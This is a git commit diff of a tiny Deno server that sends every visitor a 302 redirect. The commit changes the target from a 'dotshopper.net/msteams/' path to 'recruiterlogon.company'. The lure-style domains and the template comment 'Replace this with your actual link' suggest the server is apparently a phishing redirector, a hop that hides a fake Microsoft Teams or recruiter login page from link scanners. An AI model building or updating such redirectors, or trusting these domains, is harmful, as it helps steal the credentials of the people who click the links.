9888ee9a0003e64ec53e328861632fed76d34bb8
Digital2025001 <bosmichael30@gmail.com>
2025-11-03 07:04:18 -0600

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://dotshopper.net/msteams/", // Replace this with your actual link
+      Location: "https://recruiterlogon.company/", // Replace this with your actual link
     },
   });
 });
